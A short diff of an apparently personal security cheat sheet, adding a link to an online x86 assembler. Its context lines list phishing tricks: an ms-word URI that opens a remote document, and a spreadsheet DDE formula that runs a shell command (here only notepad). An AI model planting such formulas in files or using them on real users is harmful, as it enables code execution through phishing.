@@ -52,6 +52,13 @@ Subnet mask / CIDR / IPV4 Calculator
 
 ***
 
+ASM / hex assembler/dissasembler
+- https://defuse.ca/online-x86-assembler.htm#disassembly
+
+
+
+***
+
 **weird phishing**
 - ms-word://ofe/%7Cu%7Chttp://example.com/myTestDocument.docx
 - =cmd|' /c notepad'!A0
